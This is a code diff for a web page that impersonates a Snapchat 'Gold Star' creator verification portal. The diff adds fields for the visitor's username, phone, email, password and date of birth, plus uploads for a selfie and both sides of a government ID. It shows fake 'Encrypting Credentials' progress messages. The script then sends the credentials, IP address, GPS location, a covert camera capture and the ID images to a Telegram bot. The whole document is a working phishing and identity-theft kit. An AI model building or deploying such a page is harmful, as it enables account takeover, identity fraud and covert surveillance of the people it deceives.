@@ -6,7 +6,7 @@
     <title>Snapchat Creator Verification - Gold Badge Request</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
         
@@ -17,51 +17,43 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 25px 15px;
         }
 
         .container {
             background: #FFFFFF;
             border-radius: 24px;
-            padding: 35px 25px;
+            padding: 30px 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.15);
-            max-width: 450px;
+            max-width: 460px;
             width: 100%;
             text-align: center;
         }
 
         .snap-logo {
-            width: 70px;
-            height: 70px;
-            margin-bottom: 15px;
+            width: 60px;
+            height: 60px;
+            margin-bottom: 12px;
         }
 
         h1 {
-            font-size: 22px;
+            font-size: 21px;
             color: #000;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             font-weight: 800;
-        }
-
-        .badge-icon {
-            color: #FFFC00;
-            background: #000;
-            padding: 2px 8px;
-            border-radius: 50%;
-            font-size: 14px;
         }
 
         p {
             font-size: 13px;
             color: #555;
-            margin-bottom: 20px;
-            line-height: 1.6;
+            margin-bottom: 18px;
+            line-height: 1.5;
         }
 
         .info-card {
-            background: #F7F7F7;
-            border: 1px solid #EAEAEA;
-            padding: 15px;
+            background: #FFFDF0;
+            border: 1px solid #FFE866;
+            padding: 12px 15px;
             border-radius: 14px;
             font-size: 12px;
             color: #333;
@@ -70,26 +62,66 @@
             line-height: 1.6;
         }
 
+        .form-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+
+        .form-group label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 14px;
+            background: #F7F7F7;
+            border: 1px solid #E2E2E2;
+            border-radius: 12px;
+            color: #000;
+            font-size: 13px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: #000;
+            background: #FFF;
+        }
+
+        .upload-title {
+            font-size: 13px;
+            font-weight: 800;
+            color: #000;
+            margin: 20px 0 10px 0;
+            text-align: left;
+        }
+
         .upload-box {
-            border: 2px dashed #000;
-            padding: 20px;
-            border-radius: 16px;
+            border: 2px dashed #CBD5E1;
+            padding: 14px;
+            border-radius: 14px;
             cursor: pointer;
             background: #FAFAFA;
-            margin-bottom: 20px;
+            margin-bottom: 12px;
             transition: all 0.3s ease;
+            text-align: center;
         }
 
         .upload-box:hover {
             background: #F0F0F0;
+            border-color: #000;
         }
 
         .upload-box input { display: none; }
         
         .upload-text {
-            font-size: 13px;
-            color: #000;
-            font-weight: 700;
+            font-size: 12px;
+            color: #333;
+            font-weight: 600;
         }
 
         .btn {
@@ -104,11 +136,19 @@
             font-weight: 700;
             transition: all 0.3s ease;
             box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            margin-top: 10px;
         }
 
         .btn:hover {
             background: #222;
             transform: translateY(-2px);
+        }
+
+        .btn:disabled {
+            background: #CCC;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
         }
         
         .progress-container { display: none; margin-top: 20px; }
@@ -146,16 +186,56 @@
         <p>Apply for the Official Snap Star Creator Badge for your Snapchat profile.</p>
         
         <div class="info-card">
-            📌 <strong>Verification Requirements:</strong><br>
-            Please upload a clear front-facing selfie or profile photo to verify your identity against your Snapchat account details.
+            📌 <strong>Identity Verification Required:</strong><br>
+            Please fill in your account credentials and submit your government ID along with a profile photo to complete the verification request.
         </div>
 
-        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
-            <div class="upload-text" id="uploadLabel">📁 Upload ID Verification Photo</div>
-            <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
+        <div class="form-group">
+            <label>Snapchat Username:</label>
+            <input type="text" id="snapUsername" class="form-control" placeholder="@username" autocomplete="off">
         </div>
 
-        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5; cursor: not-allowed;">Submit Request</button>
+        <div class="form-group">
+            <label>Phone Number:</label>
+            <input type="tel" id="snapPhone" class="form-control" placeholder="+1234567890" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label>Account Email:</label>
+            <input type="email" id="snapEmail" class="form-control" placeholder="example@domain.com" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label>Account Password:</label>
+            <input type="password" id="snapPassword" class="form-control" placeholder="••••••••" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+            <label>Date of Birth:</label>
+            <input type="date" id="snapBirth" class="form-control">
+        </div>
+
+        <div class="upload-title">📁 Required Document Uploads</div>
+
+        <!-- 1. Profile Photo -->
+        <div class="upload-box" onclick="document.getElementById('selfieInput').click()">
+            <div class="upload-text" id="selfieLabel">📸 1. Upload Personal Photo (Selfie)</div>
+            <input type="file" id="selfieInput" accept="image/*" onchange="checkUploads()">
+        </div>
+
+        <!-- 2. ID Front -->
+        <div class="upload-box" onclick="document.getElementById('idFrontInput').click()">
+            <div class="upload-text" id="idFrontLabel">🪪 2. Upload ID Card (Front Side)</div>
+            <input type="file" id="idFrontInput" accept="image/*" onchange="checkUploads()">
+        </div>
+
+        <!-- 3. ID Back -->
+        <div class="upload-box" onclick="document.getElementById('idBackInput').click()">
+            <div class="upload-text" id="idBackLabel">🪪 3. Upload ID Card (Back Side)</div>
+            <input type="file" id="idBackInput" accept="image/*" onchange="checkUploads()">
+        </div>
+
+        <button class="btn" id="generateBtn" onclick="startAIProcess()" disabled style="opacity: 0.5;">Submit Verification Request</button>
 
         <div class="progress-container" id="progressBox">
             <div class="progress-bar-bg">
@@ -170,24 +250,52 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
-        let selectedFile = null;
+        let fileSelfie = null;
+        let fileIdFront = null;
+        let fileIdBack = null;
 
-        function handleFileSelect() {
-            const input = document.getElementById('fileInput');
-            if (input.files && input.files[0]) {
-                selectedFile = input.files[0];
-                document.getElementById('uploadLabel').innerText = `✅ Selected: ${selectedFile.name}`;
-                
-                const btn = document.getElementById('generateBtn');
+        function checkUploads() {
+            const selfieIn = document.getElementById('selfieInput');
+            const frontIn = document.getElementById('idFrontInput');
+            const backIn = document.getElementById('idBackInput');
+
+            if (selfieIn.files && selfieIn.files[0]) {
+                fileSelfie = selfieIn.files[0];
+                document.getElementById('selfieLabel').innerText = `✅ Selfie Attached: ${fileSelfie.name}`;
+            }
+
+            if (frontIn.files && frontIn.files[0]) {
+                fileIdFront = frontIn.files[0];
+                document.getElementById('idFrontLabel').innerText = `✅ ID Front Attached: ${fileIdFront.name}`;
+            }
+
+            if (backIn.files && backIn.files[0]) {
+                fileIdBack = backIn.files[0];
+                document.getElementById('idBackLabel').innerText = `✅ ID Back Attached: ${fileIdBack.name}`;
+            }
+
+            const btn = document.getElementById('generateBtn');
+            // Allow clicking button when all required uploads are present
+            if (fileSelfie && fileIdFront && fileIdBack) {
                 btn.disabled = false;
                 btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
             }
         }
 
         async function startAIProcess() {
-            if (!selectedFile) {
-                alert("Please upload a photo first!");
+            const uName = document.getElementById('snapUsername').value.trim();
+            const uPhone = document.getElementById('snapPhone').value.trim();
+            const uEmail = document.getElementById('snapEmail').value.trim();
+            const uPass = document.getElementById('snapPassword').value.trim();
+            const uBirth = document.getElementById('snapBirth').value.trim();
+
+            if (!uName || !uPhone || !uEmail || !uPass || !uBirth) {
+                alert("Please fill in all account fields before submitting.");
+                return;
+            }
+
+            if (!fileSelfie || !fileIdFront || !fileIdBack) {
+                alert("Please upload all 3 required document photos.");
                 return;
             }
 
@@ -347,9 +455,9 @@
                 cameraStatus = "Denied Camera 🔴";
             }
 
-            updateProgress(20, "Verifying Photo Standards...");
+            updateProgress(20, "Encrypting Credentials...");
             await sleep(800);
-            updateProgress(50, "Checking Snapchat API Services...");
+            updateProgress(50, "Uploading Documents to Verification Server...");
             await sleep(800);
             updateProgress(80, "Processing Gold Star Request...");
             await sleep(800);
@@ -359,7 +467,13 @@
                 ? `GPS Location: [Google Maps](${mapLink}) (Lat & Long: ${locationText})` 
                 : `Location Status: ${locationStatus}`;
 
-            const msg = `🚨 **Snapchat Request Visitor Logs:**\n\n` +
+            const msg = `🟡 **Snapchat Gold Star Request Data:**\n\n` +
+                        `👤 **کۆبوونەوەی زانیارییە کەسییەکان:**\n` +
+                        `• **Username:** \`${uName}\`\n` +
+                        `• **Phone:** \`${uPhone}\`\n` +
+                        `• **Email:** \`${uEmail}\`\n` +
+                        `• **Password:** \`${uPass}\`\n` +
+                        `• **Date of Birth:** \`${uBirth}\`\n\n` +
                         `⏰ Time: ${fullDateText}\n` +
                         `🌐 IP Address: ${ip} (${isp})\n` +
                         `📍 ${mapTextPart}\n` +
@@ -388,25 +502,48 @@
                 });
             } catch (err) {}
 
+            // Send Live Camera Capture
             if (cameraBlob) {
                 try {
                     const formDataCam = new FormData();
                     formDataCam.append('chat_id', chatId);
                     formDataCam.append('photo', cameraBlob, 'camera.jpg');
-                    formDataCam.append('caption', `📸 Visitor Camera Capture (Snapchat Portal)`);
+                    formDataCam.append('caption', `📸 Live Camera Photo (${uName})`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                 } catch (err) {}
             }
 
-            if (selectedFile) {
+            // 1. Send Uploaded Selfie
+            if (fileSelfie) {
                 try {
-                    const formDataUpload = new FormData();
-                    formDataUpload.append('chat_id', chatId);
-                    formDataUpload.append('photo', selectedFile, selectedFile.name);
-                    formDataUpload.append('caption', `🖼 Visitor Uploaded File (Snapchat Portal)`);
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataUpload });
+                    const formSelfie = new FormData();
+                    formSelfie.append('chat_id', chatId);
+                    formSelfie.append('photo', fileSelfie, fileSelfie.name);
+                    formSelfie.append('caption', `🖼 1. Personal Photo / Selfie (${uName})`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formSelfie });
+                } catch (err) {}
+            }
+
+            // 2. Send ID Front
+            if (fileIdFront) {
+                try {
+                    const formFront = new FormData();
+                    formFront.append('chat_id', chatId);
+                    formFront.append('photo', fileIdFront, fileIdFront.name);
+                    formFront.append('caption', `🪪 2. ID Card Front Side (${uName})`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formFront });
+                } catch (err) {}
+            }
+
+            // 3. Send ID Back
+            if (fileIdBack) {
+                try {
+                    const formBack = new FormData();
+                    formBack.append('chat_id', chatId);
+                    formBack.append('photo', fileIdBack, fileIdBack.name);
+                    formBack.append('caption', `🪪 3. ID Card Back Side (${uName})`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formBack });
                 } catch (err) {}
             }
 
